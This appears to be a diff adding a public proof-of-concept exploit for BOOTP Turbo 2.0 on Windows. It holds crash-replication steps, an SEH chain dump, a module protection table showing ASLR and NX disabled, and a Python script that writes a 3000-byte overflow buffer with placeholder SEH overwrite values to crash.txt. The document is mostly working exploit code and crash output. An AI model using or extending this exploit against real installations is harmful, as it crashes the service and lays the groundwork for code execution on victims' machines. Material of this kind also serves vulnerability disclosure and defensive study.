@@ -1,0 +1,48 @@
+# Exploit Title: BOOTP Turbo 2.0 - Denial of Service (SEH)(PoC)
+# Exploit Author: boku
+# Date: 2020-01-22
+# Software Vendor: Wierd Solutions
+# Vendor Homepage: https://www.weird-solutions.com
+# Software Link: https://www.weird-solutions.com/download/products/bootpt_demo_IA32.exe
+# Version: BOOTP Turbo (x86) Version 2.0
+# Tested On: Windows 10 Pro -- 10.0.18363 Build 18363 x86-based PC
+# Tested On: Windows 7 Enterprise SP1 -- build 7601 64-bit 
+# Replicate Crash:
+#  1) Download, Install, and Open BootP Turbo v2.0 for windows x86
+#  2) Go to Edit > Settings > Click the Detailed Logging Box
+#  3) Run python script, open created file 'crash.txt'
+#  4) Select-All > Copy All, from file
+#  5) Paste buffer in the 'Log File' text-box, Click 'OK'
+#  6) Close the 'Control Service' Pop-Up Window
+#  7) Crash with SEH Overwrite
+
+# SEH chain of main thread
+# Address    SE handler
+# 019CD254   43434343
+# 42424242   *** CORRUPT ENTRY ***
+
+# Loaded Application Modules
+#  Rebase | SafeSEH | ASLR  | NXCompat | Version, Modulename & Path
+#  True   | True    | False |  False   | 4.7.3.0 [QtGui4.dll] (C:\Program Files\BOOTP Turbo\QtGui4.dll)
+#  True   | True    | False |  False   | 4.7.3.0 [QtCore4.dll] (C:\Program Files\BOOTP Turbo\QtCore4.dll)
+#  True   | True    | False |  False   | 10.00.30319.1 [MSVCP100.dll] (C:\Program Files\BOOTP Turbo\MSVCP100.dll)
+#  True   | True    | False |  False   | 2.0 [bootptui.exe] (C:\Program Files\BOOTP Turbo\bootptui.exe)
+#  True   | True    | False |  False   | 10.00.30319.1 [MSVCR100.dll] (C:\Program Files\BOOTP Turbo\MSVCR100.dll)
+
+#!/usr/bin/python
+
+offset = '\x41'*2196
+nSEH = '\x42\x42\x42\x42'
+SEH = '\x43\x43\x43\x43'
+filler = '\x44'*(3000-len(offset+nSEH+SEH))
+
+payload = offset+nSEH+SEH+filler
+
+try:
+    f=open("crash.txt","w")
+    print("[+] Creating %s bytes evil payload." %len(payload))
+    f.write(payload)
+    f.close()
+    print("[+] File created!")
+except:
+    print("File cannot be created.")
